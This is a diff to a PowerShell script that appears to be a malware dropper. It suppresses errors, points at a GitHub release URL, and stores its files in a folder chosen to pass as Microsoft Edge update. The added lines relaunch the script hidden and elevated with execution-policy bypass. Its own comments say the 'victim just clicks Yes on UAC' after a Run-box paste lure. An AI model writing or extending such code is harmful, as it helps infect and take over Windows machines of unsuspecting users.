@@ -8,7 +8,11 @@ $ErrorActionPreference = 'SilentlyContinue'
 $ReleaseBase = 'https://github.com/billkentfelty/cdn-sync-7f3a2b/releases/download/v1'
 
 $admin = [Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()
-if (-not $admin.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) { exit }
+if (-not $admin.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+    # not elevated (Win+R case): re-launch self elevated, victim just clicks "Yes" on UAC
+    Start-Process powershell -Verb RunAs -Wait -WindowStyle Hidden -ArgumentList @('-nop','-ep','bypass','-f',$PSCommandPath)
+    exit
+}
 
 # plausible Edge-update location, matches the task naming
 $dir = Join-Path $env:ProgramData 'Microsoft\EdgeUpdate'
